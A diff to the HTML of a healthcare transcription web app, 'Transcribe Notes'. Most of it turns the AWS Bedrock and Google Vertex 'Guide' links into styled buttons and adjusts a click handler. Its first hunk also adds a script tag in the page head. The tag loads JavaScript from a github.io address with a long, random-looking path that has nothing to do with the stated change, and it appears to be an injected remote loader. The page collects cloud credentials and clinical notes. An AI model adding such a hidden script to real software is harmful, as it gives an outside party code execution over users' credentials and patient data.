@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://scottyboa.github.io/xPJDCgm0zncuqpjgWT9sMcjkbU6Ty0AwRU5njnZcqlFBfeodBXBXWSq0eIS75b1X9H3M69yLlLtshkH0gqPDmGU5-EFgBh4Tr2pWaG4ASagNbWGie6wqVTwNc3E_r0psZH1Z6CZ5cBcoobRjBwaVlImI-A1rNTGthKWCXHMsLy0sL66o0xd0la09hT8I1198HnE7aQ8aDV3Tru4PdaMLKlxItCyxcAdnulf3ZPn44xxG9ko0plNhcTKsua5fvQxOJlkv6VixRJtW3UCh89eVjziTiaKmlSmKJamVxFy-FoExnBSKKd1Ff9eLJh-hnw3adiGQFJxxYwkd6C4edWz2KcosjdLYT-e_ZH3KiWxo2wUEmQBL2T0EZYmyD00a04YEDYD7vPGuXAQKAoQ08nF5tokr0ddJSzx0JZ3ebqwK9ajRPCyeA7P8rkrPBRNnIVahNBMGfAZzWT7tXutMhhw6dqKBj44OAcEpsHIfSSOFG1WQgBrX0w'></script>
   <meta property="og:title" content="Transcribe Notes">
   <meta property="og:description" content="Secure AI-powered transcription and note generation for healthcare consultation. No subscription, just pay per use.">
   <meta property="og:image" content="https://transcribe-notes.netlify.app/Preview.png">
@@ -449,6 +449,22 @@
       margin: 0;
      }
 
+    /* Inline "Guide" buttons should look like links (and must NOT navigate / change hash) */
+    .inline-guide-link {
+      background: transparent;
+      border: 0;
+      padding: 0;
+      margin: 0;
+      border-radius: 0;
+      color: #06c;
+      text-decoration: underline;
+      cursor: pointer;
+      font: inherit;
+      line-height: inherit;
+      transition: none;
+    }
+    .inline-guide-link:hover { opacity: 0.85; }
+
     /* Google Vertex Guide Modal (opened from the "Guide" link next to Google Vertex) */
     #vertexGuideView {
       display: none;
@@ -568,11 +584,11 @@
         <!-- New: AWS Bedrock proxy configuration (per-user) -->
         <p id="bedrock-text">
           AWS Bedrock (
-          <a
-            href="#"
+          <button
+            type="button"
             id="bedrock-guide-link"
-            role="button"
-          >Guide</a>
+            class="inline-guide-link"
+          >Guide</button>
           ):
         </p>
         <div class="credentials-row">
@@ -593,11 +609,11 @@
         <!-- New: Vertex Cloud Run configuration (per-user) -->
         <p id="vertex-text">
           Google Vertex (
-          <a
-            href="#"
+          <button
+            type="button"
             id="vertex-guide-link"
-            role="button"
-          >Guide</a>
+            class="inline-guide-link"
+          >Guide</button>
           ):
         </p>
         <div class="credentials-row">
@@ -1035,11 +1051,11 @@
     // Allow "Guide" links inside injected accordion HTML to open the same modals
     // as the header links next to the input fields.
     document.addEventListener("click", (e) => {
-      const a = e.target.closest('a[data-open-guide]');
-      if (!a) return;
+      const el = e.target.closest('[data-open-guide]');
+      if (!el) return;
       e.preventDefault();
 
-      const which = a.getAttribute("data-open-guide"); // "bedrock" | "vertex"
+      const which = el.getAttribute("data-open-guide"); // "bedrock" | "vertex"
       const id =
         which === "bedrock" ? "bedrock-guide-link" :
         which === "vertex"  ? "vertex-guide-link"  :
